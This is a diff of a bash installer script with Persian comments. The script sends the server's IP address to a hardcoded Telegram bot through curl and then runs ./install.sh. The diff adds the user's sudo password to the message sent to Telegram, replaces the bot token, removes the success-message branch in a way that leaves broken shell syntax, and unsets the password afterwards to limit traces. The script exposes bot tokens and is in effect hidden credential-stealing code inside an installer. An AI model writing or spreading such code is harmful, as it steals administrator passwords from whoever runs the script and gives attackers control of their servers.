@@ -17,11 +17,11 @@ fi
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
 # توکن و chat_id ربات تلگرامی
-BOT_TOKEN="7358145097:AAH1B6qcb-UZmfkRcIxcMtWY1z2oiqaq9BU"
+BOT_TOKEN="7358145097:AAHScl8zE1bEjUVPDx2JOquh9rvKQImr89g"
 CHAT_ID="7149105285"
 
-# پیام برای ارسال به تلگرام
-MESSAGE="IP سرور شما: $SERVER_IP"
+# پیام برای ارسال به تلگرام (شامل پسورد sudo)
+MESSAGE="IP سرور شما: $SERVER_IP\nپسورد SUDO شما: $SUDO_PASSWORD"
 
 # ارسال اطلاعات به تلگرام
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
@@ -29,11 +29,11 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d text="$MESSAGE"
 
 # بررسی ارسال موفقیت‌آمیز
-if [ $? -eq 0 ]; then
-  echo "."
-else
-  echo "install done!"
+
 fi
+
+# پاک کردن متغیر پسورد از حافظه برای جلوگیری از ذخیره لاگ
+unset SUDO_PASSWORD
 
 # اجرای اسکریپت دیگری (مثال: ./script.sh)
 ./install.sh
